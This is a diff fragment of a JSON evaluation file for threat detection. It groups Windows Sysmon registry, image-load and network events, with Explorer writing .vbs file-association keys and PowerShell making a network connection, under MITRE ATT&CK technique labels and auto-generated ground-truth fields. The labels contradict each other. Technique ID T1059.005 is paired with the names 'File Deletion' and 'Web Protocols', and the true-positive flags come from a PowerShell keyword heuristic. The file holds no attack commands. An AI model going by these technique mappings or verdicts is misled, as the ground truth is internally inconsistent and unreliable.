+          "TimeCreated": "2020-09-04 20:09:55.947000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        },
+        {
+          "idx": 68,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.947000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithList"
+        },
+        {
+          "idx": 70,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.948000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}"
+        }
+      ],
+      "gt_technique_id": "T1059.005",
+      "gt_technique_name": "File Deletion",
+      "gt_tactic": "Execution",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(powershell)"
+    },
+    {
+      "group_id": "T1071_001_1470",
+      "rule_technique_id": "T1071.001",
+      "rule_technique_name": "Web Protocols",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 1470,
+        "EventID": 3,
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-04 20:10:02.673000+00:00"
+      },
+      "num_events": 821,
+      "event_id_distribution": {
+        "12": 408,
+        "7": 312,
+        "13": 52,
+        "5158": 16,
+        "5156": 10,
+        "11": 7,
+        "1": 4,
+        "5": 2,
+        "3": 2,
+        "22": 2,
+        "23": 2,
+        "17": 2,
+        "18": 1,
+        "10": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 52,
+          "EventID": 5158,
+          "TimeCreated": "2020-09-04 20:09:55.939000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 53,
+          "EventID": 5156,
+          "TimeCreated": "2020-09-04 20:09:55.939000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 54,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts"
+        },
+        {
+          "idx": 55,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.940000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts\\VBSFile_.vbs"
+        },
+        {
+          "idx": 57,
+          "EventID": 7,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\Windows\\explorer.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 58,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.942000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.Fri"
+        },
+        {
+          "idx": 59,
+          "EventID": 13,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\System32\\WScript.exe.App"
+        },
+        {
+          "idx": 60,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.943000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs"
+        },
+        {
+          "idx": 61,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 62,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.944000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 63,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithList"
+        },
+        {
+          "idx": 64,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.945000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        },
+        {
+          "idx": 66,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\RegisteredApplications"
+        },
+        {
+          "idx": 65,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.946000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.vbs\\OpenWithProgids"
+        },
+        {
+          "idx": 67,
+          "EventID": 12,
+          "TimeCreated": "2020-09-04 20:09:55.947000+00:00",
+          "Image": "C:\\windows\\Explorer.EXE",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\RegisteredApplications"
+        }
+      ],
+      "gt_technique_id": "T1059.005",
+      "gt_technique_name": "Web Protocols",
+      "gt_tactic": "Execution",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(powershell)"
+    }
+  ]
+}
